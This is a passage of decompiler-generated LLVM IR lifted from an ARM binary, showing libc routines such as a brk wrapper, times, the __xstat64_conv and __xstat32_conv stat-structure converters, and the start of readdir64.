  %v3_14e0c = inttoptr i32 %v2_14e0c to i32*
  %v4_14e0c = load i32, i32* %v3_14e0c, align 4
  %v2_14e10 = icmp eq i32 %v1_14e20, 0
  store i32 %v4_14e0c, i32* %r4.global-to-local, align 4
  br i1 %v2_14e10, label %dec_label_pc_14e34, label %dec_label_pc_14e1c

dec_label_pc_14e1c:                               ; preds = %dec_label_pc_14e0c
  %v2_14e20 = add i32 %v4_14e0c, %v1_14e20
  %v1_14e24 = call i32 @__GI_brk(i32 %v2_14e20)
  %v1_14e28 = icmp slt i32 %v1_14e24, 0
  br i1 %v1_14e28, label %dec_label_pc_14e30, label %dec_label_pc_14e1c.dec_label_pc_14e34_crit_edge

dec_label_pc_14e1c.dec_label_pc_14e34_crit_edge:  ; preds = %dec_label_pc_14e1c
  %v0_14e34.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14e34

dec_label_pc_14e30:                               ; preds = %dec_label_pc_14e1c, %dec_label_pc_14dfc
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14e34

dec_label_pc_14e34:                               ; preds = %dec_label_pc_14e0c, %dec_label_pc_14e1c.dec_label_pc_14e34_crit_edge, %dec_label_pc_14e30
  %v0_14e34 = phi i32 [ %v0_14e34.pre, %dec_label_pc_14e1c.dec_label_pc_14e34_crit_edge ], [ -1, %dec_label_pc_14e30 ], [ %v4_14e0c, %dec_label_pc_14e0c ]
  %v2_14e38 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14e38, i32* @r4, align 4
  ret i32 %v0_14e34

; uselistorder directives
  uselistorder i32 %v4_14e0c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_14e34, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_14e58 = load i32, i32* @r0, align 4
  ret i32 %v1_14e58
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_14e5c = load i32, i32* @r4, align 4
  store i32 %v3_14e5c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_14e74 = inttoptr i32 %arg2 to i8*
  %v4_14e74 = call i32 @__GI_memset(i8* %v3_14e74, i32 0, i32 104)
  %v2_14e78 = load i32, i32* %arg1, align 4
  store i32 %v2_14e78, i32* %r3.global-to-local, align 4
  %v3_14e78 = add i32 %tmp, 4
  %v4_14e78 = inttoptr i32 %v3_14e78 to i32*
  %v5_14e78 = load i32, i32* %v4_14e78, align 4
  store i32 %v5_14e78, i32* %r4.global-to-local, align 4
  %v0_14e7c = load i32, i32* %r5.global-to-local, align 4
  %v1_14e7c = inttoptr i32 %v0_14e7c to i32*
  store i32 %v2_14e78, i32* %v1_14e7c, align 4
  %v3_14e7c = add i32 %v0_14e7c, 4
  %v4_14e7c = inttoptr i32 %v3_14e7c to i32*
  %v5_14e7c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14e7c, i32* %v4_14e7c, align 4
  %v0_14e80 = load i32, i32* %r6.global-to-local, align 4
  %v1_14e80 = add i32 %v0_14e80, 12
  %v2_14e80 = inttoptr i32 %v1_14e80 to i32*
  %v3_14e80 = load i32, i32* %v2_14e80, align 4
  %v1_14e84 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e84 = add i32 %v1_14e84, 12
  %v3_14e84 = inttoptr i32 %v2_14e84 to i32*
  store i32 %v3_14e80, i32* %v3_14e84, align 4
  %v0_14e88 = load i32, i32* %r6.global-to-local, align 4
  %v1_14e88 = add i32 %v0_14e88, 96
  store i32 %v1_14e88, i32* %r3.global-to-local, align 4
  %v1_14e8c = inttoptr i32 %v1_14e88 to i32*
  %v2_14e8c = load i32, i32* %v1_14e8c, align 4
  store i32 %v2_14e8c, i32* %r3.global-to-local, align 4
  %v3_14e8c = add i32 %v0_14e88, 100
  %v4_14e8c = inttoptr i32 %v3_14e8c to i32*
  %v5_14e8c = load i32, i32* %v4_14e8c, align 4
  store i32 %v5_14e8c, i32* %r4.global-to-local, align 4
  %v1_14e90 = add i32 %v0_14e88, 56
  %v2_14e90 = inttoptr i32 %v1_14e90 to i32*
  %v3_14e90 = load i32, i32* %v2_14e90, align 4
  store i32 %v3_14e90, i32* %r2.global-to-local, align 4
  %v1_14e94 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e94 = add i32 %v1_14e94, 96
  %v3_14e94 = inttoptr i32 %v2_14e94 to i32*
  store i32 %v2_14e8c, i32* %v3_14e94, align 4
  %v0_14e98 = load i32, i32* %r4.global-to-local, align 4
  %v1_14e98 = load i32, i32* %r5.global-to-local, align 4
  %v2_14e98 = add i32 %v1_14e98, 100
  %v3_14e98 = inttoptr i32 %v2_14e98 to i32*
  store i32 %v0_14e98, i32* %v3_14e98, align 4
  %v0_14e9c = load i32, i32* %r6.global-to-local, align 4
  %v1_14e9c = add i32 %v0_14e9c, 24
  store i32 %v1_14e9c, i32* %ip.global-to-local, align 4
  %v1_14ea0 = inttoptr i32 %v1_14e9c to i32*
  %v2_14ea0 = load i32, i32* %v1_14ea0, align 4
  store i32 %v2_14ea0, i32* %ip.global-to-local, align 4
  %v3_14ea0 = add i32 %v0_14e9c, 28
  %v4_14ea0 = inttoptr i32 %v3_14ea0 to i32*
  %v5_14ea0 = load i32, i32* %v4_14ea0, align 4
  store i32 %v5_14ea0, i32* %lr.global-to-local, align 4
  %v0_14ea4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14ea4 = load i32, i32* %r5.global-to-local, align 4
  %v2_14ea4 = add i32 %v1_14ea4, 56
  %v3_14ea4 = inttoptr i32 %v2_14ea4 to i32*
  store i32 %v0_14ea4, i32* %v3_14ea4, align 4
  %v0_14ea8 = load i32, i32* %r6.global-to-local, align 4
  %v1_14ea8 = add i32 %v0_14ea8, 72
  store i32 %v1_14ea8, i32* %r3.global-to-local, align 4
  %v1_14eac = add i32 %v0_14ea8, 32
  store i32 %v1_14eac, i32* %r7.global-to-local, align 4
  %v1_14eb0 = inttoptr i32 %v1_14eac to i32*
  %v2_14eb0 = load i32, i32* %v1_14eb0, align 4
  store i32 %v2_14eb0, i32* %r7.global-to-local, align 4
  %v3_14eb0 = add i32 %v0_14ea8, 36
  %v4_14eb0 = inttoptr i32 %v3_14eb0 to i32*
  %v5_14eb0 = load i32, i32* %v4_14eb0, align 4
  store i32 %v5_14eb0, i32* %r8.global-to-local, align 4
  %v1_14eb4 = inttoptr i32 %v1_14ea8 to i32*
  %v2_14eb4 = load i32, i32* %v1_14eb4, align 4
  %v3_14eb4 = add i32 %v0_14ea8, 76
  %v4_14eb4 = inttoptr i32 %v3_14eb4 to i32*
  %v5_14eb4 = load i32, i32* %v4_14eb4, align 4
  store i32 %v5_14eb4, i32* %r1.global-to-local, align 4
  %v0_14eb8 = load i32, i32* %r5.global-to-local, align 4
  %v1_14eb8 = add i32 %v0_14eb8, 72
  %v1_14ebc = inttoptr i32 %v1_14eb8 to i32*
  store i32 %v2_14eb4, i32* %v1_14ebc, align 4
  %v3_14ebc = add i32 %v0_14eb8, 76
  %v4_14ebc = inttoptr i32 %v3_14ebc to i32*
  %v5_14ebc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14ebc, i32* %v4_14ebc, align 4
  %v0_14ec0 = load i32, i32* %r7.global-to-local, align 4
  %v1_14ec0 = load i32, i32* %r5.global-to-local, align 4
  %v2_14ec0 = add i32 %v1_14ec0, 32
  %v3_14ec0 = inttoptr i32 %v2_14ec0 to i32*
  store i32 %v0_14ec0, i32* %v3_14ec0, align 4
  %v0_14ec4 = load i32, i32* %r8.global-to-local, align 4
  %v1_14ec4 = load i32, i32* %r5.global-to-local, align 4
  %v2_14ec4 = add i32 %v1_14ec4, 36
  %v3_14ec4 = inttoptr i32 %v2_14ec4 to i32*
  store i32 %v0_14ec4, i32* %v3_14ec4, align 4
  %v0_14ec8 = load i32, i32* %r6.global-to-local, align 4
  %v1_14ec8 = add i32 %v0_14ec8, 80
  store i32 %v1_14ec8, i32* %r3.global-to-local, align 4
  %v1_14ecc = add i32 %v0_14ec8, 48
  store i32 %v1_14ecc, i32* %r7.global-to-local, align 4
  %v1_14ed0 = inttoptr i32 %v1_14ecc to i32*
  %v2_14ed0 = load i32, i32* %v1_14ed0, align 4
  store i32 %v2_14ed0, i32* %r7.global-to-local, align 4
  %v3_14ed0 = add i32 %v0_14ec8, 52
  %v4_14ed0 = inttoptr i32 %v3_14ed0 to i32*
  %v5_14ed0 = load i32, i32* %v4_14ed0, align 4
  store i32 %v5_14ed0, i32* %r8.global-to-local, align 4
  %v1_14ed4 = inttoptr i32 %v1_14ec8 to i32*
  %v2_14ed4 = load i32, i32* %v1_14ed4, align 4
  %v3_14ed4 = add i32 %v0_14ec8, 84
  %v4_14ed4 = inttoptr i32 %v3_14ed4 to i32*
  %v5_14ed4 = load i32, i32* %v4_14ed4, align 4
  store i32 %v5_14ed4, i32* %r1.global-to-local, align 4
  %v1_14ed8 = add i32 %v0_14ec8, 16
  %v2_14ed8 = inttoptr i32 %v1_14ed8 to i32*
  %v3_14ed8 = load i32, i32* %v2_14ed8, align 4
  store i32 %v3_14ed8, i32* %r2.global-to-local, align 4
  %v0_14edc = load i32, i32* %r5.global-to-local, align 4
  %v1_14edc = add i32 %v0_14edc, 80
  %v1_14ee0 = inttoptr i32 %v1_14edc to i32*
  store i32 %v2_14ed4, i32* %v1_14ee0, align 4
  %v3_14ee0 = add i32 %v0_14edc, 84
  %v4_14ee0 = inttoptr i32 %v3_14ee0 to i32*
  %v5_14ee0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14ee0, i32* %v4_14ee0, align 4
  %v0_14ee4 = load i32, i32* %r7.global-to-local, align 4
  %v1_14ee4 = load i32, i32* %r5.global-to-local, align 4
  %v2_14ee4 = add i32 %v1_14ee4, 48
  %v3_14ee4 = inttoptr i32 %v2_14ee4 to i32*
  store i32 %v0_14ee4, i32* %v3_14ee4, align 4
  %v0_14ee8 = load i32, i32* %r8.global-to-local, align 4
  %v1_14ee8 = load i32, i32* %r5.global-to-local, align 4
  %v2_14ee8 = add i32 %v1_14ee8, 52
  %v3_14ee8 = inttoptr i32 %v2_14ee8 to i32*
  store i32 %v0_14ee8, i32* %v3_14ee8, align 4
  %v0_14eec = load i32, i32* %r2.global-to-local, align 4
  %v1_14eec = load i32, i32* %r5.global-to-local, align 4
  %v2_14eec = add i32 %v1_14eec, 16
  %v3_14eec = inttoptr i32 %v2_14eec to i32*
  store i32 %v0_14eec, i32* %v3_14eec, align 4
  %v0_14ef0 = load i32, i32* %r6.global-to-local, align 4
  %v1_14ef0 = add i32 %v0_14ef0, 88
  store i32 %v1_14ef0, i32* %r3.global-to-local, align 4
  %v1_14ef4 = add i32 %v0_14ef0, 20
  %v2_14ef4 = inttoptr i32 %v1_14ef4 to i32*
  %v3_14ef4 = load i32, i32* %v2_14ef4, align 4
  store i32 %v3_14ef4, i32* %r2.global-to-local, align 4
  %v1_14ef8 = inttoptr i32 %v1_14ef0 to i32*
  %v2_14ef8 = load i32, i32* %v1_14ef8, align 4
  %v3_14ef8 = add i32 %v0_14ef0, 92
  %v4_14ef8 = inttoptr i32 %v3_14ef8 to i32*
  %v5_14ef8 = load i32, i32* %v4_14ef8, align 4
  store i32 %v5_14ef8, i32* %r1.global-to-local, align 4
  %v1_14efc = add i32 %v0_14ef0, 64
  store i32 %v1_14efc, i32* %r6.global-to-local, align 4
  %v1_14f00 = inttoptr i32 %v1_14efc to i32*
  %v2_14f00 = load i32, i32* %v1_14f00, align 4
  store i32 %v2_14f00, i32* %r6.global-to-local, align 4
  %v3_14f00 = add i32 %v0_14ef0, 68
  %v4_14f00 = inttoptr i32 %v3_14f00 to i32*
  %v5_14f00 = load i32, i32* %v4_14f00, align 4
  store i32 %v5_14f00, i32* %r7.global-to-local, align 4
  %v0_14f04 = load i32, i32* %r5.global-to-local, align 4
  %v1_14f04 = add i32 %v0_14f04, 88
  store i32 %v1_14f04, i32* %r3.global-to-local, align 4
  %v2_14f08 = add i32 %v0_14f04, 20
  %v3_14f08 = inttoptr i32 %v2_14f08 to i32*
  store i32 %v3_14ef4, i32* %v3_14f08, align 4
  %v0_14f0c = load i32, i32* %ip.global-to-local, align 4
  %v1_14f0c = load i32, i32* %r5.global-to-local, align 4
  %v2_14f0c = add i32 %v1_14f0c, 24
  %v3_14f0c = inttoptr i32 %v2_14f0c to i32*
  store i32 %v0_14f0c, i32* %v3_14f0c, align 4
  %v0_14f10 = load i32, i32* %lr.global-to-local, align 4
  %v1_14f10 = load i32, i32* %r5.global-to-local, align 4
  %v2_14f10 = add i32 %v1_14f10, 28
  %v3_14f10 = inttoptr i32 %v2_14f10 to i32*
  store i32 %v0_14f10, i32* %v3_14f10, align 4
  %v0_14f14 = load i32, i32* %r6.global-to-local, align 4
  %v1_14f14 = load i32, i32* %r5.global-to-local, align 4
  %v2_14f14 = add i32 %v1_14f14, 64
  %v3_14f14 = inttoptr i32 %v2_14f14 to i32*
  store i32 %v0_14f14, i32* %v3_14f14, align 4
  %v0_14f18 = load i32, i32* %r7.global-to-local, align 4
  %v1_14f18 = load i32, i32* %r5.global-to-local, align 4
  %v2_14f18 = add i32 %v1_14f18, 68
  %v3_14f18 = inttoptr i32 %v2_14f18 to i32*
  store i32 %v0_14f18, i32* %v3_14f18, align 4
  %v0_14f1c = load i32, i32* %r3.global-to-local, align 4
  %v1_14f1c = inttoptr i32 %v0_14f1c to i32*
  store i32 %v2_14ef8, i32* %v1_14f1c, align 4
  %v3_14f1c = add i32 %v0_14f1c, 4
  %v4_14f1c = inttoptr i32 %v3_14f1c to i32*
  %v5_14f1c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14f1c, i32* %v4_14f1c, align 4
  %v2_14f20 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14f20, i32* %r4.global-to-local, align 4
  ret i32 %v2_14ef8

; uselistorder directives
  uselistorder i32 %v0_14ef0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_14ec8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_14f28 = load i32, i32* @r4, align 4
  store i32 %v3_14f28, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_14f40 = inttoptr i32 %arg2 to i8*
  %v4_14f40 = call i32 @__GI_memset(i8* %v3_14f40, i32 0, i32 88)
  %v2_14f44 = load i32, i32* %arg1, align 4
  %v3_14f44 = add i32 %tmp, 4
  %v4_14f44 = inttoptr i32 %v3_14f44 to i32*
  %v5_14f44 = load i32, i32* %v4_14f44, align 4
  store i32 %v5_14f44, i32* %r4.global-to-local, align 4
  %v0_14f48 = load i32, i32* %r6.global-to-local, align 4
  %v1_14f48 = inttoptr i32 %v0_14f48 to i32*
  store i32 %v2_14f44, i32* %v1_14f48, align 4
  %v3_14f48 = add i32 %v0_14f48, 4
  %v4_14f48 = inttoptr i32 %v3_14f48 to i32*
  %v5_14f48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14f48, i32* %v4_14f48, align 4
  %v0_14f4c = load i32, i32* %r5.global-to-local, align 4
  %v1_14f4c = add i32 %v0_14f4c, 32
  %v1_14f50 = inttoptr i32 %v1_14f4c to i32*
  %v2_14f50 = load i32, i32* %v1_14f50, align 4
  %v3_14f50 = add i32 %v0_14f4c, 36
  %v4_14f50 = inttoptr i32 %v3_14f50 to i32*
  %v5_14f50 = load i32, i32* %v4_14f50, align 4
  store i32 %v5_14f50, i32* %r4.global-to-local, align 4
  %v1_14f54 = add i32 %v0_14f4c, 96
  %v2_14f54 = inttoptr i32 %v1_14f54 to i32*
  %v3_14f54 = load i32, i32* %v2_14f54, align 4
  store i32 %v3_14f54, i32* %r2.global-to-local, align 4
  %v1_14f58 = load i32, i32* %r6.global-to-local, align 4
  %v2_14f58 = add i32 %v1_14f58, 32
  %v3_14f58 = inttoptr i32 %v2_14f58 to i32*
  store i32 %v2_14f50, i32* %v3_14f58, align 4
  %v0_14f5c = load i32, i32* %r4.global-to-local, align 4
  %v1_14f5c = load i32, i32* %r6.global-to-local, align 4
  %v2_14f5c = add i32 %v1_14f5c, 36
  %v3_14f5c = inttoptr i32 %v2_14f5c to i32*
  store i32 %v0_14f5c, i32* %v3_14f5c, align 4
  %v0_14f60 = load i32, i32* %r2.global-to-local, align 4
  %v1_14f60 = load i32, i32* %r6.global-to-local, align 4
  %v2_14f60 = add i32 %v1_14f60, 12
  %v3_14f60 = inttoptr i32 %v2_14f60 to i32*
  store i32 %v0_14f60, i32* %v3_14f60, align 4
  %v0_14f64 = load i32, i32* %r5.global-to-local, align 4
  %v1_14f64 = add i32 %v0_14f64, 48
  %v2_14f64 = inttoptr i32 %v1_14f64 to i32*
  %v3_14f64 = load i32, i32* %v2_14f64, align 4
  %v1_14f68 = add i32 %v0_14f64, 24
  store i32 %v1_14f68, i32* %ip.global-to-local, align 4
  %v1_14f6c = inttoptr i32 %v1_14f68 to i32*
  %v2_14f6c = load i32, i32* %v1_14f6c, align 4
  store i32 %v2_14f6c, i32* %ip.global-to-local, align 4
  %v3_14f6c = add i32 %v0_14f64, 28
  %v4_14f6c = inttoptr i32 %v3_14f6c to i32*
  %v5_14f6c = load i32, i32* %v4_14f6c, align 4
  store i32 %v5_14f6c, i32* %lr.global-to-local, align 4
  %v1_14f70 = load i32, i32* %r6.global-to-local, align 4
  %v2_14f70 = add i32 %v1_14f70, 44
  %v3_14f70 = inttoptr i32 %v2_14f70 to i32*
  store i32 %v3_14f64, i32* %v3_14f70, align 4
  %v0_14f74 = load i32, i32* %r5.global-to-local, align 4
  %v1_14f74 = add i32 %v0_14f74, 64
  %v2_14f74 = inttoptr i32 %v1_14f74 to i32*
  %v3_14f74 = load i32, i32* %v2_14f74, align 4
  %v1_14f78 = add i32 %v0_14f74, 56
  %v2_14f78 = inttoptr i32 %v1_14f78 to i32*
  %v3_14f78 = load i32, i32* %v2_14f78, align 4
  store i32 %v3_14f78, i32* %r2.global-to-local, align 4
  %v1_14f7c = load i32, i32* %r6.global-to-local, align 4
  %v2_14f7c = add i32 %v1_14f7c, 52
  %v3_14f7c = inttoptr i32 %v2_14f7c to i32*
  store i32 %v3_14f74, i32* %v3_14f7c, align 4
  %v0_14f80 = load i32, i32* %r2.global-to-local, align 4
  %v1_14f80 = load i32, i32* %r6.global-to-local, align 4
  %v2_14f80 = add i32 %v1_14f80, 48
  %v3_14f80 = inttoptr i32 %v2_14f80 to i32*
  store i32 %v0_14f80, i32* %v3_14f80, align 4
  %v0_14f84 = load i32, i32* %r5.global-to-local, align 4
  %v1_14f84 = add i32 %v0_14f84, 72
  %v1_14f88 = inttoptr i32 %v1_14f84 to i32*
  %v2_14f88 = load i32, i32* %v1_14f88, align 4
  %v3_14f88 = add i32 %v0_14f84, 76
  %v4_14f88 = inttoptr i32 %v3_14f88 to i32*
  %v5_14f88 = load i32, i32* %v4_14f88, align 4
  store i32 %v5_14f88, i32* %r1.global-to-local, align 4
  %v0_14f8c = load i32, i32* %r6.global-to-local, align 4
  %v1_14f8c = add i32 %v0_14f8c, 56
  %v1_14f90 = inttoptr i32 %v1_14f8c to i32*
  store i32 %v2_14f88, i32* %v1_14f90, align 4
  %v3_14f90 = add i32 %v0_14f8c, 60
  %v4_14f90 = inttoptr i32 %v3_14f90 to i32*
  %v5_14f90 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14f90, i32* %v4_14f90, align 4
  %v0_14f94 = load i32, i32* %r5.global-to-local, align 4
  %v1_14f94 = add i32 %v0_14f94, 80
  %v1_14f98 = inttoptr i32 %v1_14f94 to i32*
  %v2_14f98 = load i32, i32* %v1_14f98, align 4
  %v3_14f98 = add i32 %v0_14f94, 84
  %v4_14f98 = inttoptr i32 %v3_14f98 to i32*
  %v5_14f98 = load i32, i32* %v4_14f98, align 4
  store i32 %v5_14f98, i32* %r1.global-to-local, align 4
  %v0_14f9c = load i32, i32* %r6.global-to-local, align 4
  %v1_14f9c = add i32 %v0_14f9c, 64
  %v1_14fa0 = inttoptr i32 %v1_14f9c to i32*
  store i32 %v2_14f98, i32* %v1_14fa0, align 4
  %v3_14fa0 = add i32 %v0_14f9c, 68
  %v4_14fa0 = inttoptr i32 %v3_14fa0 to i32*
  %v5_14fa0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14fa0, i32* %v4_14fa0, align 4
  %v0_14fa4 = load i32, i32* %r5.global-to-local, align 4
  %v1_14fa4 = add i32 %v0_14fa4, 16
  %v2_14fa4 = inttoptr i32 %v1_14fa4 to i32*
  %v3_14fa4 = load i32, i32* %v2_14fa4, align 4
  %v1_14fa8 = load i32, i32* %r6.global-to-local, align 4
  %v2_14fa8 = add i32 %v1_14fa8, 16
  %v3_14fa8 = inttoptr i32 %v2_14fa8 to i32*
  store i32 %v3_14fa4, i32* %v3_14fa8, align 4
  %v0_14fac = load i32, i32* %r5.global-to-local, align 4
  %v1_14fac = add i32 %v0_14fac, 88
  %v1_14fb0 = add i32 %v0_14fac, 20
  %v2_14fb0 = inttoptr i32 %v1_14fb0 to i32*
  %v3_14fb0 = load i32, i32* %v2_14fb0, align 4
  store i32 %v3_14fb0, i32* %r2.global-to-local, align 4
  %v1_14fb4 = inttoptr i32 %v1_14fac to i32*
  %v2_14fb4 = load i32, i32* %v1_14fb4, align 4
  %v3_14fb4 = add i32 %v0_14fac, 92
  %v4_14fb4 = inttoptr i32 %v3_14fb4 to i32*
  %v5_14fb4 = load i32, i32* %v4_14fb4, align 4
  store i32 %v5_14fb4, i32* %r1.global-to-local, align 4
  %v0_14fb8 = load i32, i32* %r6.global-to-local, align 4
  %v1_14fb8 = add i32 %v0_14fb8, 72
  %v1_14fbc = inttoptr i32 %v1_14fb8 to i32*
  store i32 %v2_14fb4, i32* %v1_14fbc, align 4
  %v3_14fbc = add i32 %v0_14fb8, 76
  %v4_14fbc = inttoptr i32 %v3_14fbc to i32*
  %v5_14fbc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14fbc, i32* %v4_14fbc, align 4
  %v0_14fc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_14fc0 = load i32, i32* %r6.global-to-local, align 4
  %v2_14fc0 = add i32 %v1_14fc0, 20
  %v3_14fc0 = inttoptr i32 %v2_14fc0 to i32*
  store i32 %v0_14fc0, i32* %v3_14fc0, align 4
  %v0_14fc4 = load i32, i32* %ip.global-to-local, align 4
  %v1_14fc4 = load i32, i32* %r6.global-to-local, align 4
  %v2_14fc4 = add i32 %v1_14fc4, 24
  %v3_14fc4 = inttoptr i32 %v2_14fc4 to i32*
  store i32 %v0_14fc4, i32* %v3_14fc4, align 4
  %v0_14fc8 = load i32, i32* %lr.global-to-local, align 4
  %v1_14fc8 = load i32, i32* %r6.global-to-local, align 4
  %v2_14fc8 = add i32 %v1_14fc8, 28
  %v3_14fc8 = inttoptr i32 %v2_14fc8 to i32*
  store i32 %v0_14fc8, i32* %v3_14fc8, align 4
  %v2_14fcc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14fcc, i32* %r4.global-to-local, align 4
  ret i32 %v2_14fb4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 5, 3, 4, 1, 2, 0, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r6, align 4
  %v1_14fe8 = add i32 %tmp, 24
  store i32 %v1_14fe8, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_15000 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 112) to i32*), align 4
  store i32 %v4_15000, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15000)
  %v0_15014 = load i32, i32* @r6, align 4
  %v2_15014 = add i32 %v0_15014, 16
  %v3_15014 = inttoptr i32 %v2_15014 to i32*
  %v4_15014 = load i32, i32* %v3_15014, align 4
  store i32 %v4_15014, i32* %ip.global-to-local, align 4
  store i32 86048, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15014)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_15024

dec_label_pc_15024:                               ; preds = %dec_label_pc_15054, %entry
  %v0_15024 = load i32, i32* @r5, align 4
  %v1_15024 = add i32 %v0_15024, 4
  %v2_15024 = inttoptr i32 %v1_15024 to i32*
  %v3_15024 = load i32, i32* %v2_15024, align 4
  %v4_15024 = add i32 %v0_15024, 8
  %v5_15024 = inttoptr i32 %v4_15024 to i32*
  %v6_15024 = load i32, i32* %v5_15024, align 4
  %tmp10 = icmp ugt i32 %v6_15024, %v3_15024
  br i1 %tmp10, label %dec_label_pc_15054, label %dec_label_pc_15030

dec_label_pc_15030:                               ; preds = %dec_label_pc_15024
  %v1_15030 = inttoptr i32 %v0_15024 to i32*
  %v2_15030 = load i32, i32* %v1_15030, align 4
  %v1_15034 = add i32 %v0_15024, 12
  %v2_15034 = inttoptr i32 %v1_15034 to i32*
  %v3_15034 = load i32, i32* %v2_15034, align 4
  %v1_15038 = add i32 %v0_15024, 20
  %v2_15038 = inttoptr i32 %v1_15038 to i32*
  %v3_15038 = load i32, i32* %v2_15038, align 4
  %v4_1503c = inttoptr i32 %v3_15034 to i32*
  %v5_1503c = call i32 @__getdents64(i32 %v2_15030, i32* %v4_1503c, i32 %v3_15038, i32 %v6_15024)
  %tmp9 = icmp slt i32 %v5_1503c, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_1504c

.thread:                                          ; preds = %dec_label_pc_15030
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15084

dec_label_pc_1504c:                               ; preds = %dec_label_pc_15030
  %v1_1504c = load i32, i32* @r5, align 4
  %v2_1504c = add i32 %v1_1504c, 8
  %v3_1504c = inttoptr i32 %v2_1504c to i32*
  store i32 %v5_1503c, i32* %v3_1504c, align 4
  %v0_15050 = load i32, i32* @r7, align 4
  %v1_15050 = load i32, i32* @r5, align 4
  %v2_15050 = add i32 %v1_15050, 4
  %v3_15050 = inttoptr i32 %v2_15050 to i32*
  store i32 %v0_15050, i32* %v3_15050, align 4
  %v0_15054.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15054

dec_label_pc_15054:                               ; preds = %dec_label_pc_15024, %dec_label_pc_1504c
  %v1_15078 = phi i32 [ %v0_15024, %dec_label_pc_15024 ], [ %v0_15054.pre, %dec_label_pc_1504c ]
  %v1_15054 = add i32 %v1_15078, 4
  %v2_15054 = inttoptr i32 %v1_15054 to i32*
  %v3_15054 = load i32, i32* %v2_15054, align 4
  %v1_15058 = add i32 %v1_15078, 12
  %v2_15058 = inttoptr i32 %v1_15058 to i32*
  %v3_15058 = load i32, i32* %v2_15058, align 4
  %v2_1505c = add i32 %v3_15058, %v3_15054
  store i32 %v2_1505c, i32* @r4, align 4
  %v3_15060 = inttoptr i32 %v2_1505c to i32*
  %v4_15060 = load i32, i32* %v3_15060, align 4
  %v1_15064 = add i32 %v2_1505c, 4
  %v2_15064 = inttoptr i32 %v1_15064 to i32*
  %v3_15064 = load i32, i32* %v2_15064, align 4
  %v1_15068 = add i32 %v2_1505c, 16
  %v2_15068 = inttoptr i32 %v1_15068 to i16*
  %v3_15068 = load i16, i16* %v2_15068, align 2
  %v4_15068 = zext i16 %v3_15068 to i32
  %v1_1506c = add i32 %v2_1505c, 8
  %v2_1506c = inttoptr i32 %v1_1506c to i32*
  %v3_1506c = load i32, i32* %v2_1506c, align 4
  store i32 %v3_1506c, i32* %ip.global-to-local, align 4
  %v2_15070 = add i32 %v4_15068, %v3_15054
  %v2_15074 = or i32 %v3_15064, %v4_15060
